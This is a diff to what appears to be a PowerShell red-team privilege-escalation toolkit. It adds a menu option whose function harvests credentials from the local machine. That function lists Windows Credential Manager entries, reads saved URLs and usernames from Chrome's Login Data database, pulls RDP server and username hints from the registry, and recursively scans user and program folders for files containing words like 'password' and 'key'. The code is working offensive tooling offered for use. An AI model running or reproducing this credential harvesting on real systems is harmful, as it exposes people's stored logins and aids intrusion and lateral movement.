@@ -1804,6 +1804,93 @@ function checkDriversPresent {
     }
 }
 
+function checkCreds {
+    try {
+        Write-Output "[$([char]0xD83D + [char]0xDC80)] Looking for easy creds..."
+        # Windows Credential Manager
+        cmdkey /list
+    }
+    catch {
+        Write-Output "[-] Error while listing Windows Credential Manager"
+    }
+
+    try {
+        # Chrome Stored Credentials
+        $chromeDB = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromeDB) {
+            Add-Type -AssemblyName "System.Data.SQLite"
+            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$chromeDB;Version=3;")
+            $conn.Open()
+
+            $query = "SELECT origin_url, username_value FROM logins"
+            $cmd = $conn.CreateCommand()
+            $cmd.CommandText = $query
+            $reader = $cmd.ExecuteReader()
+
+            while ($reader.Read()) {
+                $url = $reader["origin_url"]
+                $username = $reader["username_value"]
+                Write-Output "URL: $url, Username: $username"
+            }
+            $conn.Close()
+        }
+    }
+    catch {
+        Write-Output "[-] Error while looking for Chrome Stored Creds"
+    }
+    try {
+        # RDP Cred
+        Write-Output "[$([char]0xD83D + [char]0xDC80)] Looking for RDP creds"
+        $rdpCreds = Get-ChildItem "HKCU:\Software\Microsoft\Terminal Server Client\Servers" | ForEach-Object {
+            $serverName = $_.PSChildName
+            $userName = Get-ItemProperty $_.PSPath | Select-Object -ExpandProperty UsernameHint
+            [PSCustomObject]@{
+                Server = $serverName
+                Username = $userName
+            }
+        }
+        Write-Output "[+] RDP Creds found, may take a second to list..."
+        Write-Output $rdpCreds
+        Write-Output ""
+    }
+    catch {
+        Write-Output "[-] Error while looking for RDP creds"
+    }
+
+    try {
+        # Grep for creds
+        Write-Output "[$([char]0xD83D + [char]0xDC80)] Scanning for creds in files, may take a while..."
+        $keywordPatterns = @('password', 'pwd', 'login', 'credentials', 'key', 'username')
+        $dirsToSearch = @("$env:USERPROFILE", "$env:ProgramData", "$env:ProgramFiles", "$env:ProgramFiles(x86)", "$env:OneDrive", "$env:Path")
+
+        foreach ($dir in $dirsToSearch) {
+            # Find all matching files first, excluding the ones with 'pyenv' or 'python' in the path
+            $files = Get-ChildItem -Path $dir -Recurse -Include *.txt, *.docx, *.ini, *.md | Where-Object { $_.FullName -notmatch 'pyenv|python|pycom|pymakr|wordlist|seclist|node_modules|extensions' } | Where-Object {(get-acl $_.fullname).access.IdentityReference -Match "$env:USERDOMAIN\\$env:USERNAME"}   
+        
+            # Iterate over each file
+            foreach ($file in $files) {
+                try {
+                    # Read all file content at once
+                    $content = Get-Content $file.FullName -ErrorAction Stop
+        
+                    # Check for matching patterns
+                    foreach ($pattern in $keywordPatterns) {
+                        if ($content -match $pattern) {
+                            Write-Output "[+] Grep creds match: $($file.FullName)"
+                        }
+                    }
+                } catch {
+                    if ($DEBUG_MODE) { Write-Output "Could not read file: $($file.FullName), Error: $_" }
+                }
+            }
+        }
+        
+    }
+    catch {
+        if ($DEBUG_MODE) { Write-Output "[-] Error while grepping for creds" }
+    }
+}
+
 # Menu displayfunction 
 function showMenu {
     # Manually assign techniques to an indexed array
@@ -1822,7 +1909,8 @@ function showMenu {
     $techniques[12] = "Exploiting Weak EFS Settings"
     $techniques[13] = "Certify SAN"
     $techniques[14] = "Check for presence of vuln drivers"
-    $techniques[15] = "Run additional checks for SH collection"
+    $techniques[15] = "Check for creds (only quick wins)"
+    $techniques[16] = "Run additional checks for SH collection"
     # Prepare an array to hold the formatted output
     $output = @()
 
@@ -1859,7 +1947,7 @@ function processInput {
 
     $scanOnly = $false
     $tryAll = $false
-    $optionCount = 15
+    $optionCount = 16
 
     if ($cliInput -eq 'a') {
         return @{ Selections = 1..$optionCount; ScanOnly = $scanOnly; TryAll = $tryAll }
@@ -1940,7 +2028,8 @@ function main {
                 12 { checkEFSSettings; if (-not $scanOnly) { tryEFSSettings } }
                 13 { checkCertySAN; }
                 14 { checkDriversPresent; }
-                15 { run_SH_collection; }
+                15 { checkCreds; }
+                16 { run_SH_collection; }
                 default { Write-Output "Invalid selection: $selection" }
             }
         }
